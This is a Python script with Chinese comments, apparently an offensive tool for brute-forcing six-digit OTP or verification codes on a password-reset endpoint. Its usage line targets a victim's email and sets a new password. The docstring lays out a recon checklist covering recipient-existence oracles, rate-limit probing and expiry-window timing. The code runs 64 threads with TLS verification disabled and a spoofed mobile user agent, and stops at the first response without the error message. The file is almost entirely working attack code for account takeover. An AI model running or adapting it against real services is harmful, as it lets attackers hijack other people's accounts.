#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""otp_brute.py — 验证码/动态码并发爆破（带 oracle 判定与进度）

前置纪律（先跑完这三步再爆）：
  1) 三态 oracle：不存在的收件人 vs 刚发过码的收件人，错误文案是否不同
  2) 限流探测：连打 200 次错误码，看是否出现"频繁/锁定"
  3) 窗口测量：发码后按时间点采样，看"错误"何时变"已过期"
  然后算：1000000 / 实测QPS 是否 < 窗口秒数，超了就换思路（复用/跨账号/可预测）

用法:
  python otp_brute.py --url https://api/x/resetPassword \
      --param 'email=VICTIM@x.com&passwd=Abcd1234&confirm_passwd=Abcd1234&code={code}' \
      --hit-if-not '验证码错误' --threads 64 --digits 6

  # 只测窗口/限流
  python otp_brute.py --url ... --param '...code={code}' --probe-only
"""
import argparse
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    import urllib3
    urllib3.disable_warnings()
except Exception:
    sys.exit("需要 requests：pip install requests")

UA = {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)",
      "Accept": "application/json, text/plain, */*"}


class State:
    def __init__(self):
        self.lock = threading.Lock()
        self.done = 0
        self.hit = None
        self.seen = {}
        self.t0 = time.time()
        self.stop = False


def build(url, param_tpl, code, extra_headers):
    q = param_tpl.replace("{code}", code)
    data = {}
    for kv in q.split("&"):
        if "=" in kv:
            k, v = kv.split("=", 1)
            data[k] = v
    return url, data


def attempt(sess_kwargs, url, data, timeout):
    r = requests.post(url, data=data, headers=UA, timeout=timeout, **sess_kwargs)
    return r.text[:400]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--param", required=True, help="表单模板，用 {code} 占位")
    ap.add_argument("--hit-if-not", default="验证码错误", help="响应不含该串即视为命中")
    ap.add_argument("--threads", type=int, default=64)
    ap.add_argument("--digits", type=int, default=6)
    ap.add_argument("--start", type=int, default=0)
    ap.add_argument("--end", type=int, default=0, help="0 = 10^digits")
    ap.add_argument("--timeout", type=float, default=15)
    ap.add_argument("--probe-only", action="store_true", help="只跑 200 次限流探测")
    ap.add_argument("--insecure", action="store_true", default=True)
    ap.add_argument("--header", default="", help="额外头，k:v;k2:v2")
    a = ap.parse_args()

    end = a.end or (10 ** a.digits)
    sess_kwargs = {"verify": False}
    if a.header:
        for kv in a.header.split(";"):
            if ":" in kv:
                k, v = kv.split(":", 1)
                UA[k.strip()] = v.strip()

    st = State()
    print("[+] 目标   : %s" % a.url)
    print("[+] 区间   : %d .. %d  (%d 个)" % (a.start, end - 1, end - a.start))
    print("[+] 命中判据: 响应不含 %r" % a.hit_if_not)
    print("[+] 并发   : %d" % a.threads)

    def work(i):
        if st.stop:
            return
        code = str(i).zfill(a.digits)
        url, data = build(a.url, a.param, code, UA)
        try:
            body = attempt(sess_kwargs, url, data, a.timeout)
        except Exception as e:
            with st.lock:
                st.seen["ERR:" + str(e)[:30]] = st.seen.get("ERR:" + str(e)[:30], 0) + 1
            return
        with st.lock:
            st.done += 1
            if a.hit_if_not not in body:
                st.hit = (code, body)
                st.stop = True
                print("\n*** HIT code=%s" % code)
                print("    resp: %s" % body[:300])
                return
            key = body[:60]
            st.seen[key] = st.seen.get(key, 0) + 1
            if st.done % 500 == 0:
                el = time.time() - st.t0
                qps = st.done / el if el else 0
                left = (end - a.start - st.done) / qps if qps else 0
                print("[%7d] %.0f/s  eta=%.0fs  %s" % (st.done, qps, left, key[:50]))

    if a.probe_only:
        a.end = a.start + 200
        end = a.end
        print("[!] 限流探测模式：只打 200 次\n")

    t0 = time.time()
    with ThreadPoolExecutor(max_workers=a.threads) as ex:
        futs = [ex.submit(work, i) for i in range(a.start, end)]
        for f in as_completed(futs):
            if st.stop:
                break
    el = time.time() - t0
    print("\n=== 结果 ===")
    print("  完成  : %d" % st.done)
    print("  耗时  : %.1fs   吞吐 %.1f/s" % (el, st.done / el if el else 0))
    print("  命中  : %s" % (st.hit[0] if st.hit else "无"))
    print("  响应分布:")
    for k, v in sorted(st.seen.items(), key=lambda x: -x[1])[:6]:
        print("    %6d  %s" % (v, k))
    if a.probe_only:
        print("\n[判定] 若全部同一文案且无『频繁/锁定』 => 无限流，可进入爆破")


if __name__ == "__main__":
    main()
